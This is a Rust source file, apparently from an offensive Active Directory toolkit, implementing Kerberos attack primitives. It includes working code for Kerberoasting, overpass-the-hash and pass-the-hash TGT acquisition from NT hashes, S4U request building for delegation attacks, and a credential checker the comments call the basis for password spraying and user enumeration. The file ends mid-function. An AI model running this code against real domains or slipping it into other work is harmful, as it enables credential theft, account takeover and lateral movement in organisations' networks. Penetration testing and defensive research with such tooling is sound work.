//! Kerberoast: authenticated TGS-REQ path.
//!
//! Flow (all etype negotiation done with AES256 for the *client* key, since modern DCs
//! store AES keys for users):
//!   1. `get_tgt` — AS-REQ **with** PA-ENC-TIMESTAMP (proves knowledge of the password),
//!      decrypt the AS-REP enc-part to recover the TGT session key + the TGT itself.
//!   2. `roast_spn` — build an AP-REQ (authenticator encrypted under the session key),
//!      wrap it in a TGS-REQ for the target SPN, and extract the returned *service
//!      ticket* enc-part — the crackable Kerberoast material.
//!
//! The TGS-REQ requests an RC4 service ticket (etype 23) so the result is the canonical
//! hashcat-13100 hash. AES-only service accounts return etype 18 and are reported as such.

use crate::{format_tgs, kdc_exchange, krb_string, now_kerberos_time, principal, ETYPE_RC4_HMAC};
use anyhow::{anyhow, bail, Context, Result};

// picky-krb is still used by the not-yet-migrated AS-ccache path (asktgt / overpass_the_hash)
// and the ticket-forge path (golden/silver/diamond + ccache). The AS/TGS/roast/S4U message +
// crypto surface moved to kerbcore in the 1.5.3 swap.
use picky_asn1::bit_string::BitString;
use picky_asn1::wrapper::{
    Asn1SequenceOf, BitStringAsn1, ExplicitContextTag0, ExplicitContextTag1, ExplicitContextTag2,
    ExplicitContextTag3, ExplicitContextTag4, ExplicitContextTag5, ExplicitContextTag7,
    ExplicitContextTag8, IntegerAsn1, OctetStringAsn1, Optional,
};
use picky_krb::constants::key_usages::AS_REP_ENC;
use picky_krb::constants::types::{
    AS_REQ_MSG_TYPE, NT_PRINCIPAL, NT_SRV_INST, PA_ENC_TIMESTAMP_KEY_USAGE,
};
use picky_krb::crypto::{Cipher, CipherSuite};
use picky_krb::data_types::{
    EncryptedData, KerberosTime, PaData, PaEncTsEnc, PrincipalName, Ticket,
};
use picky_krb::messages::{AsRep, AsReq, EncAsRepPart, KdcReq, KdcReqBody, KrbError};

/// Ticket-Granting Ticket plus the material needed to use it.
///
/// `Debug` is implemented manually to redact the session key + ticket ciphertext (which
/// contains the encrypted authenticator payload). If a downstream ever embeds a `Tgt` in a
/// `#[derive(Debug)]` struct, the redaction survives. Deriving `Debug` here would leak the
/// AES256 session key on any trace-line — including the ones WS-INT-VVV (1.4.7) now turns
/// on by default in interactive mode.
pub struct Tgt {
    ticket: Ticket,
    session_key: Vec<u8>,
    /// The session key's Kerberos enctype (RFC 3961 number). Carried on the wire in the AS-REP
    /// `enc_part` (i.e. `part.key.keytype` after decrypt); 1.5.3 audit H-1 lifted this out of the
    /// length-heuristic that was misidentifying AES128 (16-byte) session keys as RC4-HMAC.
    session_etype: i32,
    cname: PrincipalName,
    crealm: String,
}

impl std::fmt::Debug for Tgt {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        f.debug_struct("Tgt")
            .field("crealm", &self.crealm)
            .field("cname", &self.cname)
            .field("session_etype", &self.session_etype)
            .field("session_key", &"***")
            .field("ticket", &"***")
            .finish()
    }
}

fn aes256() -> Box<dyn Cipher> {
    CipherSuite::Aes256CtsHmacSha196.cipher()
}

impl Tgt {
    /// The TGT's encrypted enc-part ciphertext (EncTicketPart, sealed under the krbtgt key).
    pub fn ticket_cipher(&self) -> &[u8] {
        &self.ticket.0.enc_part.0.cipher.0 .0
    }
    /// The TGT session key (from the AS-REP enc-part).
    pub fn session_key_bytes(&self) -> &[u8] {
        &self.session_key
    }
    pub fn crealm(&self) -> &str {
        &self.crealm
    }
    pub fn cname(&self) -> &PrincipalName {
        &self.cname
    }
    /// The session-key enctype (RFC 3961 number), tracked from the AS-REP reply key type.
    pub fn session_etype(&self) -> i32 {
        self.session_etype
    }
}

fn encrypted_data(etype: u8, cipher: Vec<u8>) -> EncryptedData {
    EncryptedData {
        etype: ExplicitContextTag0::from(IntegerAsn1(vec![etype])),
        kvno: Optional::from(None),
        cipher: ExplicitContextTag2::from(OctetStringAsn1(cipher)),
    }
}

fn kdc_options() -> BitStringAsn1 {
    // forwardable | renewable | canonicalize
    BitStringAsn1::from(BitString::with_bytes(vec![0x40, 0x81, 0x00, 0x00]))
}

fn nonce() -> IntegerAsn1 {
    let mut n = [0u8; 4];
    rand::RngCore::fill_bytes(&mut rand::thread_rng(), &mut n);
    n[0] &= 0x7f;
    IntegerAsn1(n.to_vec())
}

/// Build an AS-REQ for `user@realm` requesting AES256, optionally carrying pre-auth.
fn build_as_req(realm: &str, user: &str, padata: Option<PaData>) -> Result<AsReq> {
    build_as_req_etype(realm, user, padata, crate::ETYPE_AES256)
}

/// As [`build_as_req`] but requesting a specific etype (e.g. RC4 for overpass-the-hash).
fn build_as_req_etype(realm: &str, user: &str, padata: Option<PaData>, etype: u8) -> Result<AsReq> {
    let body = KdcReqBody {
        kdc_options: ExplicitContextTag0::from(kdc_options()),
        cname: Optional::from(Some(ExplicitContextTag1::from(principal(
            NT_PRINCIPAL,
            &[user],
        )?))),
        realm: ExplicitContextTag2::from(krb_string(realm)?),
        sname: Optional::from(Some(ExplicitContextTag3::from(principal(
            NT_SRV_INST,
            &["krbtgt", realm],
        )?))),
        from: Optional::from(None),
        till: ExplicitContextTag5::from(crate::far_future_time()),
        rtime: Optional::from(None),
        nonce: ExplicitContextTag7::from(nonce()),
        etype: ExplicitContextTag8::from(Asn1SequenceOf::from(vec![IntegerAsn1(vec![etype])])),
        addresses: Optional::from(None),
        enc_authorization_data: Optional::from(None),
        additional_tickets: Optional::from(None),
    };
    let pa = padata.map(|p| ExplicitContextTag3::from(Asn1SequenceOf::from(vec![p])));
    Ok(AsReq::from(KdcReq {
        pvno: ExplicitContextTag1::from(IntegerAsn1(vec![5])),
        msg_type: ExplicitContextTag2::from(IntegerAsn1(vec![AS_REQ_MSG_TYPE])),
        padata: Optional::from(pa),
        req_body: ExplicitContextTag4::from(body),
    }))
}

/// Pull the AES salt AND PBKDF2 iteration count from a KRB-ERROR's ETYPE-INFO2 pre-auth hint.
/// 1.5.3 audit M-4: `extract_salt` used to return only the salt and default 4096 iters —
/// wrong for any KDC advertising `s2kparams` (Server 2019/2022 policy can set 32768+). Now
/// decodes via kerbcore's `parse_etype_info2` and threads iters into `string_to_key`.
/// Falls back to `(default_salt, default_iters)` on missing/malformed hint (KDC will
/// KDC_ERR_PREAUTH_FAILED us cleanly if the defaults are wrong).
fn extract_salt_and_iters(
    krb_err_resp: &[u8],
    default_salt: &str,
    default_iters: u32,
) -> (String, u32) {
    let Ok(err) = kerbcore::messages::KrbError::decode(krb_err_resp) else {
        return (default_salt.to_string(), default_iters);
    };
    let Some(edata) = err.e_data.as_ref() else {
        return (default_salt.to_string(), default_iters);
    };
    // e-data is a SEQUENCE OF PA-DATA (not itself wrapped in an OCTET STRING at this layer —
    // KrbError::decode already unwrapped the outer OCTET STRING).
    use kerbcore::der::{one_or, Der, TAG_SEQUENCE};
    let Ok(seq) = one_or(edata, TAG_SEQUENCE) else {
        return (default_salt.to_string(), default_iters);
    };
    let mut r = Der::new(seq);
    while !r.is_empty() {
        let Ok((_, item)) = r.read_tlv() else { break };
        // Re-wrap item bytes as a full PaData SEQUENCE so PaData::decode reads it back.
        let elem = kerbcore::der::tlv(TAG_SEQUENCE, item);
        let Ok(pa) = kerbcore::types::PaData::decode(&elem) else {
            continue;
        };
        if pa.padata_type != 19 {
            // PA-ETYPE-INFO2 = 19
            continue;
        }
        let Ok(entries) = kerbcore::client::parse_etype_info2(&pa.padata_value) else {
            continue;
        };
        // Take the first entry that offers a salt (KDC lists preferred etype first).
        for entry in &entries {
            if let Some(salt) = entry.salt.as_deref() {
                let iters = entry.s2k_iterations().unwrap_or(default_iters);
                return (salt.to_string(), iters);
            }
        }
    }
    (default_salt.to_string(), default_iters)
}

// ── 1.5.3 kerbcore bridge helpers (temporary — removed once tgs.rs fully migrates) ──

/// Far-future ticket expiry (`till`) as a kerbcore `KerberosTime` string. Matches the picky
/// `far_future_time()` (2037-09-13) so behaviour is unchanged.
const FAR_FUTURE: &str = "20370913024805Z";

/// Current UTC as a kerbcore `KerberosTime` string (`YYYYMMDDHHMMSSZ`).
fn now_krb_str() -> String {
    use std::time::{SystemTime, UNIX_EPOCH};
    let secs = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .map(|d| d.as_secs())
        .unwrap_or(0);
    kerbcore::client::unix_to_kerberos_time(secs)
}

/// Random positive 32-bit AS/TGS-REQ nonce.
fn nonce_u32() -> u32 {
    let mut n = [0u8; 4];
    rand::RngCore::fill_bytes(&mut rand::thread_rng(), &mut n);
    n[0] &= 0x7f; // keep the ASN.1 INTEGER positive
    u32::from_be_bytes(n)
}

/// Bridge a kerbcore-decoded ticket back to a picky `Ticket` for the not-yet-migrated
/// consumers (forge / ccache). kerbcore and picky DER are differential-tested byte-identical,
/// so this round-trips losslessly. Deleted at K9.
fn picky_ticket(kc: &kerbcore::messages::Ticket) -> Result<Ticket> {
    picky_asn1_der::from_bytes::<Ticket>(&kc.encode())
        .map_err(|e| anyhow!("bridge kerbcore->picky Ticket: {e}"))
}

/// Bridge a kerbcore `PrincipalName` → picky `PrincipalName` (for the still-picky `Tgt.cname`).
/// Deleted at K9 when `Tgt` flips to kerbcore types.
fn picky_cname(kc: &kerbcore::types::PrincipalName) -> Result<PrincipalName> {
    picky_asn1_der::from_bytes::<PrincipalName>(&kc.encode())
        .map_err(|e| anyhow!("bridge kerbcore->picky PrincipalName: {e}"))
}

/// Bridge the picky `Tgt.ticket` → kerbcore `Ticket` (reverse DER round-trip). Deleted at K9.
fn kc_ticket_of(tgt: &Tgt) -> Result<kerbcore::messages::Ticket> {
    kerbcore::messages::Ticket::decode(&picky_asn1_der::to_vec(&tgt.ticket)?)
        .map_err(|e| anyhow!("bridge picky->kerbcore Ticket: {e:?}"))
}

/// Typed TGT session key using the tracked AS-REP `session_etype` (1.5.3 audit H-1 — the prior
/// length-heuristic mis-typed AES128 sessions as RC4).
fn kc_session_key_of(tgt: &Tgt) -> Result<kerbcore::KerberosKey> {
    kerbcore::KerberosKey::from_i32(tgt.session_etype, tgt.session_key.clone())
        .map_err(|e| anyhow!("TGT session key (etype {}): {e}", tgt.session_etype))
}

/// Typed service-ticket session key using the tracked TGS-REP `session_etype`.
fn kc_service_key_of(st: &ServiceTicket) -> Result<kerbcore::KerberosKey> {
    kerbcore::KerberosKey::from_i32(st.session_etype, st.session_key.clone()).map_err(|e| {
        anyhow!(
            "service ticket session key (etype {}): {e}",
            st.session_etype
        )
    })
}

/// Bridge the picky `Tgt.cname` → kerbcore `PrincipalName`. Deleted at K9.
fn kc_cname_of(tgt: &Tgt) -> Result<kerbcore::types::PrincipalName> {
    kerbcore::types::PrincipalName::decode(&picky_asn1_der::to_vec(&tgt.cname)?)
        .map_err(|e| anyhow!("bridge picky->kerbcore cname: {e:?}"))
}

/// Bridge a standalone picky `PrincipalName` → kerbcore `PrincipalName`. Used by the
/// `TicketTimestamps` boundary shim (`cname_template`) so the exported struct keeps its
/// v1.5.2 picky-typed public shape while forge internals stay on kerbcore. Deleted at K9.
fn kc_cname(pn: &PrincipalName) -> Result<kerbcore::types::PrincipalName> {
    kerbcore::types::PrincipalName::decode(&picky_asn1_der::to_vec(pn)?)
        .map_err(|e| anyhow!("bridge picky->kerbcore PrincipalName: {e:?}"))
}

/// Bridge a kerbcore Kerberos GeneralizedTime string ("YYYYMMDDHHMMSSZ") → picky
/// `KerberosTime`. Keeps the v1.5.2 `TicketTimestamps` public field types intact through
/// the kerbcore-Phase-1 migration; K9 removes this along with the picky types themselves.
fn picky_krb_time(s: &str) -> Result<KerberosTime> {
    let b = s.as_bytes();
    if b.len() != 15 || b[14] != b'Z' {
        bail!("bad kerberos generalized-time (want YYYYMMDDHHMMSSZ): {s:?}");
    }
    let n = |slice: &[u8]| -> Result<u16> {
        std::str::from_utf8(slice)?
            .parse::<u16>()
            .map_err(|e| anyhow!("kerb-time field {slice:?} of {s:?}: {e}"))
    };
    let date = picky_asn1::date::Date::new(
        n(&b[0..4])?,
        n(&b[4..6])? as u8,
        n(&b[6..8])? as u8,
        n(&b[8..10])? as u8,
        n(&b[10..12])? as u8,
        n(&b[12..14])? as u8,
    )
    .ok_or_else(|| anyhow!("invalid kerberos time components: {s:?}"))?;
    Ok(KerberosTime::from(date))
}

/// Reverse of [`picky_krb_time`]. Deleted at K9.
fn kc_krb_time_str(t: &KerberosTime) -> String {
    let d = &t.0;
    format!(
        "{:04}{:02}{:02}{:02}{:02}{:02}Z",
        d.year(),
        d.month(),
        d.day(),
        d.hour(),
        d.minute(),
        d.second()
    )
}

/// Hand-assemble a TGS-REQ (kerbcore `messages`) with arbitrary padata, an optional additional
/// ticket (S4U2Proxy), and explicit `kdc_options`. kerbcore's `client::build_tgs_req` only emits
/// the plain PA-TGS-REQ authenticator; S4U needs extra padata (PA-FOR-USER / PA-PAC-OPTIONS) and
/// the additional-ticket field, so adhammer composes it here on kerbcore's `messages`/`der`
/// (offensive composition stays in adhammer per kerbcore's dual-use rule).
/// 1.5.3 audit H-2: encode the KDC-REQ-BODY FIRST, hand its DER to `build_pa_tgs_req` so the
/// AP-REQ authenticator can checksum it (RFC 4120 §3.3.2), then splice the PA-TGS-REQ padata
/// (+ any extra padata like PA-FOR-USER / PA-PAC-OPTIONS) into the outer TGS-REQ.
fn build_s4u_tgs_req(
    realm: &str,
    sname: &kerbcore::types::PrincipalName,
    kdc_options: u32,
    additional: Option<&kerbcore::messages::Ticket>,
    etypes: &[i32],
    build_pa_tgs_req: impl FnOnce(&[u8]) -> Result<kerbcore::types::PaData>,
    extra_padata: Vec<kerbcore::types::PaData>,
) -> Result<Vec<u8>> {
    // additional-tickets [11] content is `SEQUENCE OF Ticket`.
    let additional_tickets = additional.map(|t| kerbcore::der::encode_sequence(&t.encode()));
    let body = kerbcore::messages::KdcReqBody {
        kdc_options,
        cname: None, // identity comes from the ticket
        realm: realm.to_string(),
        sname: Some(sname.clone()),
        from: None,
        till: kerbcore::types::KerberosTime(FAR_FUTURE.to_string()),
        rtime: None,
        nonce: nonce_u32(),
        etypes: etypes.to_vec(),
        addresses: None,
        enc_authorization_data: None,
        additional_tickets,
    };
    let body_der = body.encode();
    let mut padata = Vec::with_capacity(1 + extra_padata.len());
    padata.push(build_pa_tgs_req(&body_der)?);
    padata.extend(extra_padata);
    Ok(kerbcore::messages::KdcReq {
        msg_type: 12,
        padata,
        req_body: body,
    }
    .encode())
}

/// AS-REP roast a TGT via the two-step AS exchange: first an un-authenticated AS-REQ to
/// learn the real salt (ETYPE-INFO2), then an AS-REQ with PA-ENC-TIMESTAMP.
///
/// 1.5.3 kerbcore swap: the AS crypto (string-to-key, PA-ENC-TIMESTAMP seal, AS-REP decrypt,
/// session-key extract) + message build/parse run on `kerbcore`; salt + s2kparams iteration
/// count come from [`extract_salt_and_iters`] (also on kerbcore, 1.5.3 audit M-4). The ticket
/// is bridged back to a picky `Ticket` ([`picky_ticket`]) for the not-yet-migrated `Tgt` consumers.
pub async fn get_tgt(user: &str, password: &str, realm: &str, kdc: &str) -> Result<Tgt> {
    let realm = realm.to_uppercase();
    // The Kerberos client principal is the bare sAMAccountName — strip any UPN suffix
    // (user@realm) or NetBIOS prefix (DOMAIN\user) that came from the LDAP bind identity.
    let user = user.split('@').next().unwrap_or(user);
    let user = user.rsplit('\\').next().unwrap_or(user);
    let default_salt = format!("{realm}{user}");
    let cname_kc = kerbcore::client::client_cname(user);
    tracing::debug!(
        user, realm = %realm, kdc, cipher = "aes256-cts-hmac-sha1-96 (kerbcore)",
        "get_tgt: AS-REQ round-trip start"
    );

    // Step 1 — no pre-auth: expect KRB-ERROR(25 = PREAUTH_REQUIRED) carrying ETYPE-INFO2.
    let raw1 = kerbcore::client::build_as_req(
        &realm,
        &cname_kc,
        nonce_u32(),
        FAR_FUTURE,
        &[crate::ETYPE_AES256 as i32],
        Vec::new(),
    );
    tracing::trace!(bytes = raw1.len(), "AS-REQ#1 sent (no pre-auth)");
    let resp1 = kdc_exchange(kdc, &raw1).await?;
    tracing::trace!(bytes = resp1.len(), "AS-REQ#1 response");
    // 1.5.3 audit M-4: salt + s2kparams iteration count via kerbcore's parse_etype_info2 (was
    // picky, dropped s2kparams — a non-4096 KDC broke pre-auth silently).
    let (salt, iters) = if kerbcore::messages::KdcRep::decode(&resp1).is_ok() {
        (default_salt.clone(), 4096) // pre-auth not required (rare)
    } else {
        match kerbcore::messages::KrbError::decode(&resp1) {
            Ok(err) if err.error_code == 25 => extract_salt_and_iters(&resp1, &default_salt, 4096),
            Ok(err) => bail!("KDC error {} on initial AS-REQ", err.error_code),
            Err(e) => bail!("unexpected AS response: {e:?}"),
        }
    };

    // AES256 string-to-key with the iteration count the KDC advertised (or RFC 3962 default 4096).
    let key = kerbcore::KerberosKey::string_to_key(
        kerbcore::Enctype::Aes256CtsHmacSha1_96,
        password,
        salt.as_bytes(),
        iters,
    );

    // Step 2 — AS-REQ with PA-ENC-TIMESTAMP encrypted under the derived key (usage 1).
    let ts_der = kerbcore::client::encode_pa_enc_ts_enc(&now_krb_str(), 0);
    let enc_ts = key.encrypt(kerbcore::client::KU_AS_REQ_PA_ENC_TS, &ts_der);
    let ed = kerbcore::types::EncryptedData {
        etype: crate::ETYPE_AES256 as i32,
        kvno: None,
        cipher: enc_ts,
    };
    let padata = kerbcore::client::pa_enc_timestamp(&ed);
    let raw2 = kerbcore::client::build_as_req(
        &realm,
        &cname_kc,
        nonce_u32(),
        FAR_FUTURE,
        &[crate::ETYPE_AES256 as i32],
        vec![padata],
    );
    tracing::trace!(bytes = raw2.len(), "AS-REQ#2 sent (with PA-ENC-TIMESTAMP)");
    let resp2 = kdc_exchange(kdc, &raw2).await?;
    tracing::trace!(bytes = resp2.len(), "AS-REQ#2 response");
    let as_rep = kerbcore::messages::KdcRep::decode(&resp2).map_err(|e| {
        match kerbcore::messages::KrbError::decode(&resp2) {
            Ok(err) => {
                tracing::warn!(code = err.error_code, "KDC rejected pre-auth AS-REQ");
                anyhow!("pre-auth AS-REQ rejected, KDC error {}", err.error_code)
            }
            Err(_) => anyhow!("AS-REP decode: {e:?}"),
        }
    })?;

    // Decrypt the AS-REP enc-part (usage 3) → EncKDCRepPart → session key.
    let plain = key
        .decrypt(
            kerbcore::client::KU_AS_REP_ENC_PART,
            &as_rep.enc_part.cipher,
        )
        .map_err(|e| anyhow!("decrypt AS-REP: {e}"))?;
    let part = kerbcore::client::parse_enc_kdc_rep_part(&plain)
        .map_err(|e| anyhow!("EncAsRepPart decode: {e:?}"))?;
    let session_key = part.key.keyvalue;
    tracing::debug!(
        session_key_len = session_key.len(),
        etype = as_rep.enc_part.etype,
        "TGT acquired (kerbcore)"
    );

    Ok(Tgt {
        ticket: picky_ticket(&as_rep.ticket)?,
        session_key,
        // 1.5.3 audit H-1: track the real session-key etype from EncKDCRepPart.key.keytype.
        session_etype: part.key.keytype,
        cname: principal(NT_PRINCIPAL, &[user])?,
        crealm: realm,
    })
}

/// Ask-TGT: obtain a TGT with a password (AES256 first, with ETYPE-INFO2 salt discovery) and emit
/// a reusable MIT ccache for Kerberos-only (`-k`) workflows. If the account has no AES key (the KDC
/// answers ETYPE_NOSUPP) — e.g. the built-in Administrator whose password was set before the domain
/// existed, or an RC4-only account — it transparently falls back to an RC4-HMAC TGT from the NT hash.
pub async fn asktgt(user: &str, realm: &str, kdc: &str, password: &str) -> Result<Vec<u8>> {
    let realm = realm.to_uppercase();
    let user = user.split('@').next().unwrap_or(user);
    let user = user.rsplit('\\').next().unwrap_or(user);
    tracing::debug!(
        user, realm = %realm, kdc, cipher = "aes256-cts-hmac-sha1-96",
        "asktgt: AS-REQ round-trip start (ccache output path)"
    );

    let cipher = aes256();
    let etype = crate::ETYPE_AES256;
    let default_salt = format!("{realm}{user}");
    let raw1 = picky_asn1_der::to_vec(&build_as_req(&realm, user, None)?)
        .map_err(|e| anyhow!("encode AS-REQ#1: {e}"))?;
    tracing::trace!(
        bytes = raw1.len(),
        "AS-REQ#1 sent (no pre-auth, salt discovery)"
    );
    let resp1 = kdc_exchange(kdc, &raw1).await?;
    tracing::trace!(bytes = resp1.len(), "AS-REQ#1 response");
    let salt = if picky_asn1_der::from_bytes::<AsRep>(&resp1).is_ok() {
        default_salt.clone()
    } else {
        // 1.5.3 audit M-4: use kerbcore's parse_etype_info2; picky's string_to_key inside
        // `cipher.generate_key_from_password` hardcodes 4096 iterations, so the returned iters
        // count is dropped here (this path is the still-picky asktgt tail — full s2kparams
        // support arrives when asktgt migrates to kerbcore, at which point iters land too).
        let (s, _iters) = extract_salt_and_iters(&resp1, &default_salt, 4096);
        s
    };
    let key = cipher
        .generate_key_from_password(password.as_bytes(), salt.as_bytes())
        .map_err(|e| anyhow!("derive AES key: {e}"))?;

    // AS-REQ with PA-ENC-TIMESTAMP under the derived key.
    let ts = PaEncTsEnc {
        patimestamp: ExplicitContextTag0::from(now_kerberos_time()),
        pausec: Optional::from(None),
    };
    let ts_der = picky_asn1_der::to_vec(&ts).map_err(|e| anyhow!("encode PA-TS: {e}"))?;
    let enc_ts = cipher
        .encrypt(&key, PA_ENC_TIMESTAMP_KEY_USAGE, &ts_der)
        .map_err(|e| anyhow!("encrypt PA-TS: {e}"))?;
    let padata = PaData {
        padata_type: ExplicitContextTag1::from(IntegerAsn1(vec![0x02])),
        padata_data: ExplicitContextTag2::from(OctetStringAsn1(
            picky_asn1_der::to_vec(&encrypted_data(etype, enc_ts))
                .map_err(|e| anyhow!("encode PA-TS ED: {e}"))?,
        )),
    };
    let raw2 = picky_asn1_der::to_vec(&build_as_req_etype(&realm, user, Some(padata), etype)?)
        .map_err(|e| anyhow!("encode AS-REQ#2: {e}"))?;
    let resp2 = kdc_exchange(kdc, &raw2).await?;
    if let Ok(err) = picky_asn1_der::from_bytes::<KrbError>(&resp2) {
        // KDC_ERR_ETYPE_NOSUPP (14): the account has no AES key — e.g. its password was set
        // outside a domain context (the built-in Administrator on a freshly promoted DC) or it is
        // RC4-only. Fall back to an RC4-HMAC TGT derived from the NT hash of the password.
        if err.0.error_code.0 == 14 {
            let nt = crate::rc4::nt_hash(password);
            return overpass_the_hash(user, &realm, kdc, &nt).await;
        }
        bail!("AS-REQ rejected, KDC error {}", err.0.error_code.0);
    }
    let as_rep: AsRep =
        picky_asn1_der::from_bytes(&resp2).map_err(|e| anyhow!("AS-REP decode: {e}"))?;
    let enc = &as_rep.0.enc_part.0;
    let plain = cipher
        .decrypt(&key, AS_REP_ENC, &enc.cipher.0 .0)
        .map_err(|e| anyhow!("decrypt AS-REP: {e}"))?;
    let enc_part: EncAsRepPart =
        picky_asn1_der::from_bytes(&plain).map_err(|e| anyhow!("EncAsRepPart decode: {e}"))?;
    crate::pkinit::build_ccache(&as_rep, &enc_part, &realm, user)
}

/// Stream 5 / A.7: obtain a live `Tgt` (session key + ticket) from just an NT hash — the
/// in-memory counterpart to [`overpass_the_hash`], which returns a serialized ccache. Used by
/// `attack rbcd --nt-hash` and any callsite that needs to fold an S4U/TGS chain on top of a
/// pass-the-hash TGT without a temporary ccache round-trip. Same wire behaviour: single AS-REQ
/// with PA-ENC-TIMESTAMP encrypted under RC4-HMAC (the NT hash *is* the Kerberos key).
pub async fn get_tgt_by_hash(user: &str, realm: &str, kdc: &str, nt: &[u8; 16]) -> Result<Tgt> {
    let realm = realm.to_uppercase();
    let user = user.split('@').next().unwrap_or(user);
    let user = user.rsplit('\\').next().unwrap_or(user);
    let cname_kc = kerbcore::client::client_cname(user);

    // The NT hash *is* the RC4-HMAC Kerberos key (etype 23) — no salt/string-to-key.
    let key = kerbcore::KerberosKey::from_i32(ETYPE_RC4_HMAC as i32, nt.to_vec())
        .map_err(|e| anyhow!("RC4 key from NT hash: {e}"))?;
    let ts_der = kerbcore::client::encode_pa_enc_ts_enc(&now_krb_str(), 0);
    let enc_ts = key.encrypt(kerbcore::client::KU_AS_REQ_PA_ENC_TS, &ts_der);
    let ed = kerbcore::types::EncryptedData {
        etype: ETYPE_RC4_HMAC as i32,
        kvno: None,
        cipher: enc_ts,
    };
    let padata = kerbcore::client::pa_enc_timestamp(&ed);
    let raw = kerbcore::client::build_as_req(
        &realm,
        &cname_kc,
        nonce_u32(),
        FAR_FUTURE,
        &[ETYPE_RC4_HMAC as i32],
        vec![padata],
    );
    let resp = kdc_exchange(kdc, &raw).await?;
    let as_rep = kerbcore::messages::KdcRep::decode(&resp).map_err(|e| {
        match kerbcore::messages::KrbError::decode(&resp) {
            Ok(err) => anyhow!(
                "AS-REQ rejected, KDC error {} (RC4 disabled on this DC? — RC4 is off by default on Server 2025)",
                err.error_code
            ),
            Err(_) => anyhow!("AS-REP decode: {e:?}"),
        }
    })?;
    let plain = key
        .decrypt(
            kerbcore::client::KU_AS_REP_ENC_PART,
            &as_rep.enc_part.cipher,
        )
        .map_err(|e| anyhow!("decrypt AS-REP (RC4): {e}"))?;
    let part = kerbcore::client::parse_enc_kdc_rep_part(&plain)
        .map_err(|e| anyhow!("EncAsRepPart decode: {e:?}"))?;
    // 1.5.3 audit H-1: `keytype` is authoritative — RC4 AS-REP over the NT-hash key stays 23.
    let session_etype = part.key.keytype;
    Ok(Tgt {
        ticket: picky_ticket(&as_rep.ticket)?,
        session_key: part.key.keyvalue,
        session_etype,
        cname: principal(NT_PRINCIPAL, &[user])?,
        crealm: realm,
    })
}

/// Overpass-the-hash: obtain a TGT from just an NT hash via RC4-HMAC (etype 23) — the legacy
/// (RC4-enabled, Server ≤2022) path. No salt discovery needed: the RC4 Kerberos key *is* the NT
/// hash, so a captured/pass-the-hash NT hash becomes a full Kerberos TGT (ccache).
pub async fn overpass_the_hash(
    user: &str,
    realm: &str,
    kdc: &str,
    nt: &[u8; 16],
) -> Result<Vec<u8>> {
    let realm = realm.to_uppercase();
    let user = user.split('@').next().unwrap_or(user);
    let user = user.rsplit('\\').next().unwrap_or(user);
    let etype = ETYPE_RC4_HMAC;

    // PA-ENC-TIMESTAMP encrypted under the NT hash (RC4-HMAC, key usage 1).
    let ts = PaEncTsEnc {
        patimestamp: ExplicitContextTag0::from(now_kerberos_time()),
        pausec: Optional::from(None),
    };
    let ts_der = picky_asn1_der::to_vec(&ts).map_err(|e| anyhow!("encode PA-TS: {e}"))?;
    let enc_ts = crate::rc4::encrypt(nt, PA_ENC_TIMESTAMP_KEY_USAGE, &ts_der, None);
    let padata = PaData {
        padata_type: ExplicitContextTag1::from(IntegerAsn1(vec![0x02])), // PA-ENC-TIMESTAMP
        padata_data: ExplicitContextTag2::from(OctetStringAsn1(
            picky_asn1_der::to_vec(&encrypted_data(etype, enc_ts))
                .map_err(|e| anyhow!("encode PA-TS ED: {e}"))?,
        )),
    };
    let raw = picky_asn1_der::to_vec(&build_as_req_etype(&realm, user, Some(padata), etype)?)
        .map_err(|e| anyhow!("encode AS-REQ: {e}"))?;
    let resp = kdc_exchange(kdc, &raw).await?;
    let as_rep: AsRep = picky_asn1_der::from_bytes(&resp).map_err(|e| {
        match picky_asn1_der::from_bytes::<KrbError>(&resp) {
            Ok(err) => anyhow!(
                "AS-REQ rejected, KDC error {} (RC4 disabled on this DC? — RC4 is off by default on Server 2025)",
                err.0.error_code.0
            ),
            Err(_) => anyhow!("AS-REP decode: {e}"),
        }
    })?;
    let enc = &as_rep.0.enc_part.0;
    let plain = crate::rc4::decrypt(nt, AS_REP_ENC, &enc.cipher.0 .0)
        .map_err(|e| anyhow!("decrypt AS-REP (RC4): {e}"))?;
    let enc_part: EncAsRepPart =
        picky_asn1_der::from_bytes(&plain).map_err(|e| anyhow!("EncAsRepPart decode: {e}"))?;
    crate::pkinit::build_ccache(&as_rep, &enc_part, &realm, user)
}

/// Outcome of a Kerberos pre-auth credential check (password spray / user enum).
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub enum CredResult {
    Valid,           // AS-REP returned — password correct
    ValidButExpired, // correct password, must change (KEY_EXPIRED)
    Invalid,         // PREAUTH_FAILED — wrong password
    Disabled,        // CLIENT_REVOKED — locked/disabled/expired account
    NoPreAuth,       // DONT_REQ_PREAUTH — AS-REP roastable, password not verifiable this way
    NoSuchUser,      // C_PRINCIPAL_UNKNOWN — account does not exist
    Other(u32),
    /// 1.5.3 audit L-2: KDC reply was neither a valid AS-REP nor a KRB-ERROR (malformed / probe
    /// tampering / MITM). Distinct from `Other(0)` (which was a code-0 collision) so a spraying
    /// caller can classify "bogus wire" separately from "KDC error code 0".
    Malformed,
}

/// Validate one credential via a Kerberos AS pre-auth exchange (no LDAP needed). The KDC
/// error code classifies the result — the basis for password spraying and user enumeration.
pub async fn check_credential(
    user: &str,
    password: &str,
    realm: &str,
    kdc: &str,
) -> Result<CredResult> {
    let realm = realm.to_uppercase();
    let user = user.split('@').next().unwrap_or(user);
    let user = user.rsplit('\\').next().unwrap_or(user);
    let default_salt = format!("{realm}{user}");
    let cname_kc = kerbcore::client::client_cname(user);

    // Step 1 — no pre-auth: classify by response.
    let raw1 = kerbcore::client::build_as_req(
        &realm,
        &cname_kc,
        nonce_u32(),
        FAR_FUTURE,
        &[crate::ETYPE_AES256 as i32],
        Vec::new(),
    );
    let resp1 = kdc_exchange(kdc, &raw1).await?;
    if kerbcore::messages::KdcRep::decode(&resp1).is_ok() {
        return Ok(CredResult::NoPreAuth); // pre-auth not required for this account
    }
    // 1.5.3 audit M-4: salt + s2kparams iters via kerbcore's parse_etype_info2.
    let (salt, iters) = match kerbcore::messages::KrbError::decode(&resp1) {
        Ok(err) => match err.error_code {
            25 => extract_salt_and_iters(&resp1, &default_salt, 4096), // PREAUTH_REQUIRED — normal
            6 => return Ok(CredResult::NoSuchUser),
            c => return Ok(CredResult::Other(c as u32)),
        },
        Err(e) => bail!("unexpected AS response: {e:?}"),
    };

    // Step 2 — pre-auth with the candidate password (AES256, KDC-advertised or default 4096 iters).
    let key = kerbcore::KerberosKey::string_to_key(
